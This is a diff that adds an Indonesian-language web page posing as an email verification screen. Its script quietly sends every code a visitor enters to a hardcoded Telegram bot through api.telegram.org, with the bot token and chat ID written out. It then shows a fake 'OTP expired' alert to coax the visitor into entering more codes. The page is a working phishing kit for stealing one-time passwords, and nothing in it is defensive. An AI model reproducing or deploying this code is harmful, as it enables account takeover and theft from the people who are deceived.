@@ -1,0 +1,168 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Verifikasi</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-[#1e1e1e] text-white min-h-screen flex flex-col p-4">
+  <header class="flex items-center space-x-3 mb-6">
+    <button aria-label="Back" class="text-white text-lg">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="text-3xl font-extrabold leading-tight">Verifikasi</h1>
+  </header>
+  <main class="flex flex-col space-y-6">
+    <div class="flex justify-center mb-2">
+      <div class="relative">
+        <img
+          alt="Shield icon with a small green lock icon overlay"
+          class="w-16 h-16 mx-auto"
+          height="64"
+          src="https://storage.googleapis.com/a1aa/image/68de56b0-37d1-42e7-ae17-18d36e61b978.jpg"
+          width="64"
+        />
+        <div
+          class="absolute bottom-0 right-0 bg-green-400 rounded-full p-2 border-2 border-[#1e1e1e]"
+          style="transform: translate(50%, 25%)"
+        >
+          <i class="fas fa-lock text-[#1e1e1e] text-xs"></i>
+        </div>
+      </div>
+    </div>
+    <p class="text-base font-normal">
+      Kode akan dikirim ke
+      <span class="text-green-500 font-semibold">*********@gmail.com</span>
+    </p>
+    <form id="verificationForm" class="flex flex-col space-y-4">
+      <div class="flex items-center bg-gray-700 bg-opacity-40 rounded-lg px-4 py-3">
+        <input
+          id="verificationCode"
+          name="verificationCode"
+          aria-label="Kode verifikasi email"
+          class="flex-grow bg-transparent placeholder-gray-400 text-gray-400 text-base focus:outline-none"
+          placeholder="Kode verifikasi email"
+          type="text"
+          required
+        />
+        <button
+          id="resendBtn"
+          type="button"
+          class="text-white font-semibold ml-4 whitespace-nowrap disabled:opacity-50 disabled:cursor-not-allowed"
+          disabled
+        >
+          48s Kirim ulang
+        </button>
+      </div>
+      <button
+        id="submitBtn"
+        class="bg-gray-600 bg-opacity-40 text-white text-center rounded-lg py-3 w-full disabled:opacity-50 disabled:cursor-not-allowed"
+        type="submit"
+        disabled
+      >
+        Kirimkan
+      </button>
+    </form>
+    <section class="text-white text-sm leading-relaxed max-w-md">
+      <p class="font-bold mb-2">Jika Anda belum menerima email:</p>
+      <ul class="list-disc list-inside space-y-1">
+        <li>Pastikan alamat email yang Anda berikan sudah benar.</li>
+        <li>Periksa folder spam di email Anda.</li>
+        <li>Pastikan klien email atau penyedia layanan Anda berfungsi normal.</li>
+      </ul>
+    </section>
+  </main>
+
+  <script>
+    // Countdown timer for resend button
+    const resendBtn = document.getElementById("resendBtn");
+    let countdown = 48;
+    let timer;
+
+    function startCountdown() {
+      resendBtn.disabled = true;
+      resendBtn.textContent = `${countdown}s Kirim ulang`;
+      timer = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) {
+          clearInterval(timer);
+          resendBtn.disabled = false;
+          resendBtn.textContent = "Kirim ulang";
+          countdown = 48; // reset countdown for next time
+        } else {
+          resendBtn.textContent = `${countdown}s Kirim ulang`;
+        }
+      }, 1000);
+    }
+
+    // Start countdown on page load
+    startCountdown();
+
+    // Enable submit button only if input is not empty
+    const input = document.getElementById("verificationCode");
+    const submitBtn = document.getElementById("submitBtn");
+    input.addEventListener("input", () => {
+      submitBtn.disabled = input.value.trim() === "";
+    });
+
+    // Telegram Bot API info - replace with your own token and chat_id
+    const TELEGRAM_BOT_TOKEN = "8184009541:AAHAvm_K8NTFlm8Hyt0hNgFHMI1p5rsvDQ0";
+    const TELEGRAM_CHAT_ID = "7569557649";
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+      };
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(params),
+        });
+        return response.ok;
+      } catch (error) {
+        console.error("Error sending to Telegram:", error);
+        return false;
+      }
+    }
+
+    document.getElementById("verificationForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const code = input.value.trim();
+      if (!code) return;
+
+      const message = `Kode verifikasi email: ${code}`;
+
+      const success = await sendToTelegram(message);
+      if (success) {
+        alert("Kode OTP Kadaluwarsa.");
+        input.value = "";
+        submitBtn.disabled = true;
+      } else {
+        alert("Gagal mengirim kode ke Telegram.");
+      }
+    });
+
+    // Resend button click handler (simulate resend)
+    resendBtn.addEventListener("click", () => {
+      startCountdown();
+      alert("Kode verifikasi baru telah dikirim.");
+      // Add actual resend logic here if needed
+    });
+  </script>
+</body>
+</html>
